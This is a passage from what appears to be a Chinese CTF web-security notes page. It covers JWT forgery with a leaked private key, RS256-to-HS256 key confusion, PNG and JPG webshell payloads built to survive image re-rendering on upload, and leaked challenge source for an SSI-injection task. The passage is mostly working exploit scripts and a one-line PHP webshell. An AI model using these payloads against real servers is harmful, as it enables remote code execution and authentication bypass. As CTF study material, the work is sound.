class="hljs-keyword">function</span> (<span class="hljs-params">err, decoded</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (decoded.user === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>      res.end(flag)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.end(<span class="hljs-string">&#x27;you are not admin&#x27;</span>)<br>    &#125;<br>  &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>发现公钥私钥都在public文件夹下，下载私钥，利用私钥生成jwt</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">var</span> privatekey = fs.readFileSync(<span class="hljs-string">&#x27;private.key&#x27;</span>)<br><span class="hljs-keyword">var</span> token = jwt.sign(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privatekey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;)<br><span class="hljs-built_in">console</span>.log(token)<br></code></pre></td></tr></table></figure><p>覆盖Cookie[auth]即可</p><h3 id="对称HS256公钥生成jwt"><a href="#对称HS256公钥生成jwt" class="headerlink" title="对称HS256公钥生成jwt"></a>对称HS256公钥生成jwt</h3><p>下载公钥，更改非对称算法RS256为HS256</p><p>利用上面脚本生成jwt，覆盖即可</p><h2 id="文件上传之二次渲染"><a href="#文件上传之二次渲染" class="headerlink" title="文件上传之二次渲染"></a>文件上传之二次渲染</h2><ul><li>PNG</li></ul><p>上传图片马，打开文件预览后下载，发现一句话已经不在，对此文件<strong>写入IDAT数据块</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><span class="hljs-variable">$img</span> = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; sizeof(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = imagecolorallocate(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   imagesetpixel(<span class="hljs-variable">$img</span>, round(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br>imagepng(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;1.png&#x27;</span>);  <span class="hljs-comment">//要修改的图片的路径</span><br><span class="hljs-comment">/* 木马内容</span><br><span class="hljs-comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">GET:0=system</span><br><span class="hljs-comment">POST:1=ls</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后上传，传参后下载新加载的图片，查看图片的代码即可</p><p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">https://www.fujieace.com/penetration-test/upload-labs-pass-16.html</a></p><ul><li>JPG</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="hljs-comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    1) Upload an arbitrary image via secured files upload script</span><br><span class="hljs-comment">    2) Save the processed image and launch:</span><br><span class="hljs-comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="hljs-comment">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="hljs-comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="hljs-comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    See also:</span><br><span class="hljs-comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;<br><br><br>    <span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;gd&#x27;</span>) || !function_exists(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    set_error_handler(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>        <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>        <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$outStream</span> = file_get_contents(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readShort() != <span class="hljs-number">0xFFD8</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;readByte() == <span class="hljs-number">0xFF</span>)) &#123;<br>            <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;readByte();<br>            <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;readShort() - <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$dis</span>-&gt;skip(<span class="hljs-variable">$size</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>                <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek();<br>                <span class="hljs-variable">$outStreamTmp</span> =<br>                    substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) .<br>                    <span class="hljs-variable">$miniPayload</span> .<br>                    str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) .<br>                    substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>                checkImage(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof())) &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte() === <span class="hljs-number">0xFF</span>) &#123;<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek() - <span class="hljs-number">2</span>;<br>                    <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                    <span class="hljs-variable">$outStream</span> =<br>                        substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) .<br>                        <span class="hljs-variable">$miniPayload</span> .<br>                        substr(<br>                            str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                                substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                            <span class="hljs-number">0</span>,<br>                            <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) .<br>                                substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>                &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                    <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(checkImage(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    unlink(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>        file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>        imagecreatefromjpeg(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>            unlink(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>                <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$filename</span>) || !is_file(<span class="hljs-variable">$filename</span>))<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                <span class="hljs-keyword">$this</span>-&gt;binData = file_get_contents(<span class="hljs-variable">$filename</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>            &#125;<br>            <span class="hljs-keyword">$this</span>-&gt;size = strlen(<span class="hljs-keyword">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">$this</span>-&gt;size - strlen(<span class="hljs-keyword">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;eof()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$byte</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> ord(<span class="hljs-variable">$byte</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$short</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;order) &#123;<br>                <span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-keyword">$this</span>-&gt;binData||(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2020-BDJCTF-Web-easy-search"><a href="#2020-BDJCTF-Web-easy-search" class="headerlink" title="2020-BDJCTF-Web-easy_search"></a>2020-BDJCTF-Web-easy_search</h2><p>dirsearch扫出index.php.swp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ob_start();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br><span class="hljs-variable">$content</span> = uniqid().<span class="hljs-variable">$random</span>;<br><span class="hljs-keyword">return</span> sha1(<span class="hljs-variable">$content</span>);<br>&#125;<br>    header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == substr(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.get_hash().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = fopen(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">***&#x27;</span>;<br>            fwrite(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            fclose(<span class="hljs-variable">$shtml</span>);<br>            ***<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br><br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>***<br>    &#125;<br>***<br><span 